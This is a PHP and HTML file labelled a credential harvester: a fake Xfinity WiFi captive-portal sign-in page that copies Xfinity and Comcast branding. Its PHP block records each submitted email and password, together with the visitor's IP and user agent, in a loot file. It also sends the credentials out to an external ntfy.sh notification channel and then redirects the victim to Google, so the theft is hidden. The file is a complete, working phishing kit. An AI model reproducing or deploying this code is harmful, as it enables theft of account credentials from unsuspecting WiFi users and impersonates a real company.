<?php
// GARMR Xfinity Portal - Credential Harvester
$loot_file = '/root/loot/garmr/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];

    $log = "[$timestamp] XFINITY | Email: $email | Password: $password | IP: $ip | UA: $ua\n";
    file_put_contents($loot_file, $log, FILE_APPEND | LOCK_EX);

    $ntfy_msg = "📡 XFINITY CREDS\nEmail: $email\nPass: $password\nIP: $ip";
    @file_get_contents("https://ntfy.sh/HALE-Pager-Alerts", false, stream_context_create([
        'http' => ['method' => 'POST', 'header' => 'Content-Type: text/plain', 'content' => $ntfy_msg]
    ]));

    header('Location: http://www.google.com');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xfinity WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            text-align: center;
        }
        .logo {
            width: 200px;
            height: 60px;
            margin: 0 auto 25px;
        }
        .logo svg {
            width: 100%;
            height: 100%;
        }
        h1 {
            color: #000;
            font-size: 22px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            color: #333;
            font-weight: 500;
            margin-bottom: 6px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #e4002b;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #e4002b;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        button:hover {
            background: #c70025;
        }
        .xfinity-info {
            margin-top: 20px;
            padding: 15px;
            background: #f5f5f5;
            border-radius: 8px;
            font-size: 13px;
            color: #333;
        }
        .member-note {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
        }
        .member-note a {
            color: #e4002b;
            text-decoration: none;
            font-weight: 500;
        }
        .terms {
            margin-top: 20px;
            font-size: 11px;
            color: #999;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
                <!-- Xfinity wordmark style -->
                <text x="10" y="45" font-family="Arial, sans-serif" font-size="38" font-weight="bold" fill="#000">
                    <tspan fill="#e4002b">x</tspan>finity
                </text>
                <!-- Signature dots -->
                <circle cx="175" cy="15" r="4" fill="#e4002b"/>
                <circle cx="185" cy="15" r="4" fill="#e4002b"/>
                <circle cx="195" cy="15" r="4" fill="#e4002b"/>
            </svg>
        </div>

        <h1>Connect to Xfinity WiFi</h1>
        <p class="subtitle">Sign in with your Xfinity account</p>

        <form method="POST" action="capture.php">
            <div class="form-group">
                <label for="email">Xfinity ID (Email)</label>
                <input type="email" id="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>

        <div class="xfinity-info">
            <strong>📡 Millions of Hotspots Nationwide</strong><br>
            Connect automatically wherever you see "xfinitywifi"
        </div>

        <p class="member-note">
            Not an Xfinity customer? <a href="#">Get a free trial</a>
        </p>

        <p class="terms">
            By signing in, you agree to the Xfinity WiFi Terms and Conditions
            and Comcast's Privacy Policy.
        </p>
    </div>
</body>
</html>
